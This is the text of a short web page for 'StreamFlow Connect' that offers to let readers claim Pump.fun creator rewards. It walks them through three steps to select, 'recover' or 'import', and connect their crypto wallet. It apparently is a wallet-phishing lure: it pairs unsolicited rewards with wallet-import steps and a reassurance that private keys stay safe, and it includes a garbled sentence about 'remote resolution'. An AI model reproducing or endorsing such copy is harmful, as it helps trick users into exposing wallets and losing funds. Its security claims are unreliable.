StreamFlow Connect

Claim Pump.fun Creators Rewards Securely Through StreamFlow Connect

StreamFlow Connect is a blockchain-based protocol that enables users to link their mobile crypto wallets to DApps. This supports secure connections and interactions within the web3 ecosystem.

The protocols establish a remote resolution between all non-custodial wallet.

3 Simple Steps to Get Started

1

Select Wallet

Pick from our extensive list of supported crypto wallets to sync, validate, correct, or recover your wallet.

2

Confirm Wallet

Verify ownership of the wallet you wish to import. Private keys remain within mobile wallets, ensuring user funds' security.

3

Connect Securely

Utilize end-to-end encryption with client-side generated keys to keep all user activities confidential.
